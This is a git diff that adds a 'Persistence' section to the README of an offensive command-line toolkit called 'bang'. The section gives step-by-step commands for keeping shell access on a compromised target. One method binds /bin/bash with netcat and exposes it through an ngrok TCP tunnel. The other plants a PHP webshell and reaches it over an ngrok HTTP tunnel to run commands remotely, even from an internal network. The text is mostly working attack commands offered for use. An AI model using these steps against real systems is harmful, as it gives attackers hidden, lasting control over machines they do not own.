@@ -303,3 +303,49 @@ bang.screen.reattach
 * Search for a shortcut in bang: `bang.find [shortcut]`
 
 ## Persistence
+
+Keep a shell accessible on your target. **Even if it is in internal network**
+Requirement:
+* `ngrok` forwarded to the target
+* Target can reach the world wide web (generally the case even in internal network)
+
+### Via a tcp tunnel
+
+On the target launch a reverse shell the way you prefer, for example:
+```shell
+nc 127.0.0.1 4444 -e /bin/bash #does need sudo privilege
+```
+
+Now initiate the tcp tunnel between the target machine and the world wide web:
+```shell
+ngrok tcp 4444
+```
+This line can be copy to the clipboard from attacker machine with `bang.expose.tcp.cpy`
+
+Ngrok will give you an address to join to access the tunnel. Connect to the reverse shell as follow from the attacker machine:
+```shell
+nc [ngrok_addr] [ngrok_port]
+# And enjoy!
+```shell
+
+### Via webshell
+
+On target launch the one-liner that launch a php server hosting a webshell. The one-liner is obtained with:
+```shell
+bang.webshell.php.cpy [port]
+```
+
+then initiate the http tunnel between the target machine and the world wide web:
+```shell
+ngrok http [port]
+```
+
+You can now interact with the target local webshell passing trough the ngrok worldwide available url (with `curl`,your browser, etc). To ease communication:
+```
+export WSURL=[ngrok_http_endpoint]
+bang.webshell.php.dial [cmd]     #execute your command on target and retrieve stdout
+```
+
+
+
+
